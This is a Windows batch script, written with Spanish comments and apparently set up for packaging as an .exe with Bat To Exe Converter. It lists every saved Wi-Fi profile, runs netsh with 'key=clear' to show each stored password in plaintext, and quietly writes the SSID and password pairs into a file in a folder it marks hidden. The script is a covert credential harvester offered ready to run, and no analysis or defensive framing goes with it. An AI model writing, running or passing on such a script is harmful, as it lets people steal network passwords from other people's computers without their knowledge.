::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJH2hx2ERGjx1f0SlGUWfNJQwzdvH5O+enRxMA7tsLsHS2bvu
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRmL5Ec+KxRQSWQ=
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJhZks0
::ZQ05rAF9IBncCkqN+0xwdVsFAlXMbAs=
::ZQ05rAF9IAHYFVzEqQIHDj9nbza2XA==
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDp67/esFUaVOpEZ++Pv4Pq7lWs5d9ALKN2OlLGWJYA=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal

:: --- Configuración ---
set "outputFile=wpsd.txt"
set "outputFolder=invisible"

:: --- Función para obtener el nombre de archivo con incremento ---
set "fileCounter=0"
:checkFile
if exist "%outputFolder%\%outputFile%" (
    set /a "fileCounter+=1"
    set "outputFile=wpsd%fileCounter%.txt"
    goto :checkFile
)

:: --- Crear carpeta oculta en el directorio actual ---
md "%outputFolder%" 2>nul
attrib +h "%outputFolder%"

:: Redirigir toda la salida a NUL
netsh wlan show profiles | findstr /C:"Perfil de todos los usuarios" > temp_perfiles.txt 2>nul

if exist "temp_perfiles.txt" (
    for /F "tokens=2 delims=:" %%a in (temp_perfiles.txt) do (
        set "profile=%%a"
        setlocal enabledelayedexpansion
        echo SSID: !profile:~1! >> "%outputFolder%\%outputFile%"
        netsh wlan show profile name="!profile:~1!" key=clear | findstr /C:"Contenido de la clave" > temp_clave.txt 2>nul
        if exist "temp_clave.txt" (
            for /F "tokens=2 delims=:" %%b in (temp_clave.txt) do (
                echo PWD: %%b >> "%outputFolder%\%outputFile%"
            )
            del temp_clave.txt
        ) else (
            echo No se encontró la contraseña para el perfil: !profile:~1! >> "%outputFolder%\%outputFile%"
        )
        echo ----------------------------------------- >> "%outputFolder%\%outputFile%"
        endlocal
    )
    del temp_perfiles.txt
) else (
    echo No se encontraron perfiles de Wi-Fi. >&2
)

endlocal
exit
